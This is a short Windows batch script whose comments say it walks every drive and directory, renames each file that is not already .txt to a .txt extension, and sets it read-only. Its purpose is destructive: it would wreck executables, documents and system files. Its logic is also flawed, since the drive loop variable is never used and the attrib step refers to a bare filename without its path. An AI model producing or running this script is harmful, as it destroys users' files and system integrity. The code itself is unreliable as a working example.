@echo off
rem Loop through all drives
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    rem Loop through all directories in the current drive
    for /r %%f in (*) do (
        rem Check if the file extension is not already .txt
        if not "%%~xf"==".txt" (
            rem Rename the file to have a .txt extension
            ren "%%f" "%%~nf.txt"
            rem Make the file read-only
            attrib +r "%%~nf.txt"
        )
    )
)
